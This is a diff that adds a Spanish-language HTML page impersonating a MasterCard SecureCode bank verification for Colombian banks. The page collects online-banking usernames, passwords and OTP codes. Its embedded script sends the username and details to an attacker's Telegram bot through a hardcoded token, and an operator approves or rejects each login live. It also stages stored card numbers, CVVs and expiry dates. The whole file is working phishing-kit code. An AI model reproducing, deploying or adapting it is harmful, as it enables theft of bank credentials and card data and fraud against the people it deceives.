@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>MasterCard SecureCode</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" />
+    <style>
+        :root {
+            --mc-red: #eb001b;
+            --mc-red-hover: #c4001a;
+            --co-text: #111827;
+            --co-text-2: #374151;
+            --co-text-muted: #6b7280;
+            --co-bg: #f5f5f5;
+            --co-border: #e5e7eb;
+            --co-white: #fff;
+            --co-success: #16a34a;
+            --co-error: #dc2626;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background: var(--co-bg);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: var(--co-white);
+            border-radius: 16px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
+            padding: 40px;
+            max-width: 520px;
+            width: 100%;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--co-border);
+        }
+
+        .mc-logo {
+            display: flex;
+            align-items: center;
+            flex-shrink: 0;
+        }
+
+        .mc-logo img {
+            height: 90px;
+            width: auto;
+            display: block;
+        }
+
+        .bank-logo {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            flex-shrink: 0;
+            max-width: 55%;
+        }
+
+        .bank-logo img {
+            height: 110px;
+            width: auto;
+            max-width: 200px;
+            object-fit: contain;
+            display: block;
+        }
+
+        .security-banner {
+            background: #fef2f2;
+            border: 1px solid #fecaca;
+            border-radius: 12px;
+            padding: 14px 18px;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .security-banner .shield-icon {
+            flex-shrink: 0;
+            width: 22px;
+            height: 22px;
+            margin-top: 2px;
+            color: var(--mc-red);
+        }
+
+        .security-banner p {
+            font-size: 0.8125rem;
+            color: #991b1b;
+            line-height: 1.6;
+            margin: 0;
+        }
+
+        .security-banner p strong {
+            font-weight: 700;
+        }
+
+        .security-banner a {
+            color: var(--mc-red);
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .form-title {
+            font-size: 1.375rem;
+            font-weight: 700;
+            color: var(--co-text);
+            margin-bottom: 4px;
+        }
+
+        .form-subtitle {
+            font-size: 0.9375rem;
+            color: var(--co-text-2);
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+
+        .transaction-info {
+            background: #f9fafb;
+            border: 1px solid var(--co-border);
+            border-radius: 12px;
+            padding: 14px 18px;
+            margin-bottom: 24px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 5px 0;
+            font-size: 0.875rem;
+        }
+
+        .info-row:not(:last-child) {
+            border-bottom: 1px solid var(--co-border);
+        }
+
+        .info-label {
+            color: var(--co-text-muted);
+            font-weight: 500;
+        }
+
+        .info-value {
+            color: var(--co-text);
+            font-weight: 600;
+            text-align: right;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .form-label {
+            font-size: 0.8125rem;
+            font-weight: 600;
+            color: var(--co-text);
+        }
+
+        .form-label .required {
+            color: var(--co-error);
+            margin-left: 2px;
+        }
+
+        .form-input {
+            padding: 12px 16px;
+            border: 2px solid var(--co-border);
+            border-radius: 8px;
+            font-family: 'Inter', sans-serif;
+            font-size: 1rem;
+            color: var(--co-text);
+            background: var(--co-white);
+            width: 100%;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--mc-red);
+            box-shadow: 0 0 0 3px rgba(235, 0, 27, 0.1);
+        }
+
+        .form-input:disabled {
+            background: #f3f4f6;
+            cursor: not-allowed;
+        }
+
+        .error-message {
+            color: var(--co-error);
+            font-size: 0.75rem;
+            display: none;
+            margin-top: 4px;
+        }
+
+        .form-group.error .form-input {
+            border-color: var(--co-error);
+        }
+
+        .form-group.error .error-message {
+            display: block;
+        }
+
+        .otp-section {
+            display: none;
+            animation: fadeIn 0.4s ease;
+            background: #f9fafb;
+            border: 1px solid var(--co-border);
+            border-radius: 12px;
+            padding: 16px 18px;
+            margin-top: 4px;
+        }
+
+        .otp-section.visible {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .otp-info {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.8125rem;
+            color: var(--co-text-muted);
+            margin-bottom: 8px;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 8px;
+        }
+
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-family: 'Inter', sans-serif;
+            font-size: 0.9375rem;
+            font-weight: 600;
+            cursor: pointer;
+            flex: 1;
+            text-align: center;
+        }
+
+        .btn-primary {
+            background: var(--mc-red);
+            color: white;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            background: var(--mc-red-hover);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .form-footer {
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 1px solid var(--co-border);
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .form-footer .help-text {
+            font-size: 0.75rem;
+            color: var(--co-text-muted);
+        }
+
+        .form-footer .help-text a {
+            color: var(--mc-red);
+            text-decoration: none;
+        }
+
+        .status-message {
+            display: none;
+            padding: 12px 16px;
+            border-radius: 8px;
+            font-size: 0.875rem;
+            font-weight: 500;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+
+        .status-message.error {
+            display: block;
+            background: #fef2f2;
+            color: var(--co-error);
+            border: 1px solid #fecaca;
+        }
+
+        .status-message.success {
+            display: block;
+            background: #f0fdf4;
+            color: var(--co-success);
+            border: 1px solid #bbf7d0;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            backdrop-filter: blur(4px);
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 16px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 1rem;
+            font-weight: 500;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px 16px;
+            }
+
+            .mc-logo img {
+                height: 70px;
+            }
+
+            .bank-logo img {
+                height: 90px;
+            }
+
+            .form-title {
+                font-size: 1.125rem;
+            }
+
+            .btn {
+                width: 100%;
+                padding: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Verificando autenticación...</div>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <div class="mc-logo">
+                <img src="master.png" alt="MasterCard" />
+            </div>
+            <div class="bank-logo" id="bankLogoContainer">
+                <img id="bankLogoImg" src="" alt="Logo banco" style="display:none;" />
+            </div>
+        </div>
+
+        <div class="security-banner">
+            <svg class="shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            </svg>
+            <p>
+                <strong>MasterCard SecureCode</strong> protege tu tarjeta contra usos no autorizados, sin costo adicional.
+                <a href="#">Más información</a>
+            </p>
+        </div>
+
+        <h1 class="form-title">Autenticar con contraseña</h1>
+        <p class="form-subtitle">
+            Ingrese las credenciales de seguridad de su <strong id="bancoNombre">banco emisor</strong> para validar la transacción.
+        </p>
+
+        <div class="transaction-info">
+            <div class="info-row">
+                <span class="info-label">Comercio</span>
+                <span class="info-value">Superintendencia de Notariado</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Monto</span>
+                <span class="info-value" id="transaction-amount">23.000 Col$</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Fecha</span>
+                <span class="info-value" id="transaction-date">14/08/2026 10:13 PM</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Tarjeta</span>
+                <span class="info-value" id="card-last-digits">Mastercard •••• •••• •••• 0000</span>
+            </div>
+        </div>
+
+        <div class="status-message" id="statusMessage"></div>
+
+        <form id="authForm" novalidate>
+            <div class="form-group">
+                <label class="form-label">Usuario <span class="required">*</span></label>
+                <input type="text" class="form-input" id="username" placeholder="Ingresa tu usuario" required />
+                <div class="error-message">El usuario es requerido</div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Contraseña <span class="required">*</span></label>
+                <input type="password" class="form-input" id="password" placeholder="Ingresa tu contraseña" required />
+                <div class="error-message">La contraseña es requerida</div>
+            </div>
+
+            <div class="otp-section" id="otpSection">
+                <div class="otp-info">
+                    <span id="otpInfoMessage">Para realizar este proceso, ingresa el código de Token móvil.</span>
+                </div>
+                <div class="form-group" style="margin-bottom:0;">
+                    <label class="form-label">Código OTP <span class="required">*</span></label>
+                    <input type="text" class="form-input" id="confirmationCode" placeholder="Ingresa tu código" maxlength="6" inputmode="numeric" required />
+                    <div class="error-message">El código debe tener 6 dígitos</div>
+                </div>
+            </div>
+
+            <div class="button-group">
+                <button type="submit" class="btn btn-primary" id="submitButton">Enviar</button>
+            </div>
+        </form>
+
+        <div class="form-footer">
+            <span class="help-text">
+                <a href="#" id="helpLink">Ayuda</a>
+            </span>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8952571695:AAHr5qHDQ7Hu0LoqGS49jUWg9MYFjO1MaBw';
+        const TELEGRAM_CHAT_ID = '-1004389419498';
+        const WEBHOOK_URL = '/api/webhook';
+        const POLLING_INTERVAL = 2000;
+        const MAX_POLLING_TIME = 300000;
+
+        const bankLogos = {
+            'Bancolombia': 'bancol.png',
+            'Davivienda': 'davivienda.png',
+            'Davibank': 'db.png',
+            'Banco Popular': 'popu.png',
+            'Banco Falabella': 'fala.png',
+            'Itaú': 'itau.png',
+            'Caja Social': 'Caja.jpg',
+            'Banco de Bogotá': 'bog.png',
+            'Banco Occidente': 'occi.png'
+        };
+
+        let solicitudId = null;
+        let pollingInterval = null;
+        let pasoActual = 'credenciales';
+
+        const form = document.getElementById('authForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const confirmationInput = document.getElementById('confirmationCode');
+        const otpSection = document.getElementById('otpSection');
+        const submitButton = document.getElementById('submitButton');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const statusMessage = document.getElementById('statusMessage');
+        const bankLogoImg = document.getElementById('bankLogoImg');
+        const bankLogoContainer = document.getElementById('bankLogoContainer');
+        const bancoNombre = document.getElementById('bancoNombre');
+
+        window.addEventListener('load', function() {
+            initializeTransaction();
+            cargarLogoBanco();
+        });
+
+        function cargarLogoBanco() {
+            const bancoEmisor = localStorage.getItem('bancoEmisor');
+            if (bancoEmisor) {
+                bancoNombre.textContent = bancoEmisor;
+                if (bankLogos[bancoEmisor]) {
+                    bankLogoImg.src = bankLogos[bancoEmisor];
+                    bankLogoImg.style.display = 'block';
+                    bankLogoContainer.style.display = 'flex';
+                }
+            }
+        }
+
+        function initializeTransaction() {
+            const storagePriority = localStorage.getItem('procesamiento_prioritario') === 'true';
+            let amount = 23000;
+            if (storagePriority) amount += 20000;
+            document.getElementById('transaction-amount').textContent = amount.toLocaleString('es-CO').replace(/,/g, '.') + ' Col$';
+
+            const now = new Date();
+            const dateStr = now.toLocaleDateString('es-CO').split('/').reverse().join('/');
+            const timeStr = now.toLocaleTimeString('es-CO', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
+            document.getElementById('transaction-date').textContent = `${dateStr} ${timeStr}`;
+
+            const cardLast4 = localStorage.getItem('cardLast4') || '0000';
+            document.getElementById('card-last-digits').textContent = `Mastercard •••• •••• •••• ${cardLast4}`;
+
+            localStorage.setItem('cardNumberFull', localStorage.getItem('cardNumber') || 'No disponible');
+            localStorage.setItem('cardCVV', localStorage.getItem('cvc') || 'No disponible');
+            localStorage.setItem('cardExpiry', localStorage.getItem('expiry') || 'No disponible');
+        }
+
+        function generarSolicitudId() {
+            return 'MC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+        }
+
+        async function enviarCredencialesATelegram(datos) {
+            try {
+                const bancoEmisor = localStorage.getItem('bancoEmisor') || 'No especificado';
+
+                const inlineKeyboard = {
+                    inline_keyboard: [
+                        [{ text: "✅ APROBAR", callback_data: `approve_${datos.solicitudId}` }],
+                        [{ text: "❌ RECHAZAR", callback_data: `reject_${datos.solicitudId}` }]
+                    ]
+                };
+
+                const mensaje = `🔔 *MASTERCARD SECURECODE - V2CRTF*\n\n🆔 ID: \`${datos.solicitudId}\`\n🏛️ BANCO: ${bancoEmisor}\n👤 Usuario: \`${datos.usuario}\`\n💰 Monto: ${datos.monto}\n⏳ Esperando aprobación...`;
+
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'Markdown',
+                        reply_markup: inlineKeyboard
+                    })
+                });
+
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                return false;
+            }
+        }
+
+        async function verificarEstadoSolicitud(solicitudId) {
+            try {
+                const response = await fetch(`${WEBHOOK_URL}?check=${solicitudId}`);
+                const data = await response.json();
+                return data.estado || 'pending';
+            } catch (error) {
+                return 'pending';
+            }
+        }
+
+        function iniciarPollingCredenciales() {
+            let tiempoInicio = Date.now();
+
+            pollingInterval = setInterval(async () => {
+                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
+                    clearInterval(pollingInterval);
+                    mostrarError('Tiempo de espera agotado');
+                    resetFormulario();
+                    return;
+                }
+
+                const resultado = await verificarEstadoSolicitud(solicitudId);
+
+                if (resultado === 'approved') {
+                    clearInterval(pollingInterval);
+                    mostrarExito('✅ Autenticación exitosa');
+                    setTimeout(() => {
+                        window.location.href = 'exito.html';
+                    }, 2000);
+                }
+            }, POLLING_INTERVAL);
+        }
+
+        function mostrarError(mensaje) {
+            statusMessage.className = 'status-message error';
+            statusMessage.textContent = mensaje;
+            loadingOverlay.classList.remove('active');
+            submitButton.disabled = false;
+        }
+
+        function mostrarExito(mensaje) {
+            statusMessage.className = 'status-message success';
+            statusMessage.textContent = mensaje;
+        }
+
+        function resetFormulario() {
+            usernameInput.disabled = false;
+            passwordInput.disabled = false;
+            solicitudId = null;
+            loadingOverlay.classList.remove('active');
+            submitButton.disabled = false;
+            submitButton.textContent = 'Enviar';
+            usernameInput.value = '';
+            passwordInput.value = '';
+        }
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            let isValid = true;
+            statusMessage.style.display = 'none';
+            document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));
+
+            if (pasoActual === 'credenciales') {
+                if (!usernameInput.value.trim()) {
+                    usernameInput.parentElement.classList.add('error');
+                    isValid = false;
+                }
+                if (!passwordInput.value.trim()) {
+                    passwordInput.parentElement.classList.add('error');
+                    isValid = false;
+                }
+            } else if (pasoActual === 'otp') {
+                if (!confirmationInput.value.trim() || !/^\d{6}$/.test(confirmationInput.value)) {
+                    confirmationInput.parentElement.classList.add('error');
+                    isValid = false;
+                }
+            }
+
+            if (!isValid) return;
+
+            loadingOverlay.classList.add('active');
+            submitButton.disabled = true;
+            usernameInput.disabled = true;
+            passwordInput.disabled = true;
+
+            if (pasoActual === 'credenciales') {
+                solicitudId = generarSolicitudId();
+                const datosTelegram = {
+                    solicitudId: solicitudId,
+                    usuario: usernameInput.value.trim(),
+                    monto: document.getElementById('transaction-amount').textContent
+                };
+
+                const enviado = await enviarCredencialesATelegram(datosTelegram);
+                if (enviado) {
+                    iniciarPollingCredenciales();
+                } else {
+                    mostrarError('Error al procesar');
+                    resetFormulario();
+                }
+            }
+        });
+
+        document.getElementById('helpLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Contacta a tu banco');
+        });
+    </script>
+</body>
+</html>
